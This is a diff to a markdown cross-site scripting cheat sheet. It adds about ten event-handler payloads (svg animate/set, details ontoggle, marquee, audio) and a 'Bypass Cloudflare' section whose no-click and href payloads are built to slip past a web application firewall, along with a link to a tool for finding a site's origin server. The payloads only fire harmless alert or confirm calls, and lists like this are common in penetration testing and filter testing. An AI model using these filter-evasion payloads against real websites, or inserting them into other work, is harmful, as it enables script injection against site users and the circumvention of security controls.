@@ -111,13 +111,23 @@ test@example(<script>alert(0)</script>).com
 <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="> # base64 <script>alert(1)</script>
 ```
 
-### Without Space
+### Without closing tag 
 ```html
 <img/src/onerror=alert(1)>
-<Img/Src/OnError=_=prompt,_(1)>
 <svg/onload=alert(1)>
 <object/data=javascript:prompt(1)>
 <input/autofocus/onfocus=prompt(1)>
+<audio/src/onloadstart=alert(1)>
+<svg><animate/onbegin=alert(1)>
+<svg><animate/dur='1s'onend=alert(1)>
+<svg><set/onbegin=alert(1)>
+<svg><set/dur='1ms'onend=alert(1)>
+<marquee width=1 loop=1 onfinish=alert(1)>
+<details/open/ontoggle=confirm(1)>
+<details open ontoggle=confirm(1)>
+<details/ontoggle='alert(1)'/open>
+<details ontoggle=alert(1) open>
+
 ```
 
 ### Without dot 
@@ -342,10 +352,17 @@ _http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoA
 https://kloudle.com/blog/the-infamous-8kb-aws-waf-request-body-inspection-limitation/
 
 ### Bypass Cloudflare
+
+No click
 ```html
 <img//////src=x oNlY=1 oNerror=alert('xxs')//
 <img src=x on onerror=alert()>
 ```
+Href Bypass
+```
+<a"/onclick=(confirm)()>Click%20Here!
+```
+
 - Identify server origin
 https://github.com/gwen001/cloudflare-origin-ip
 
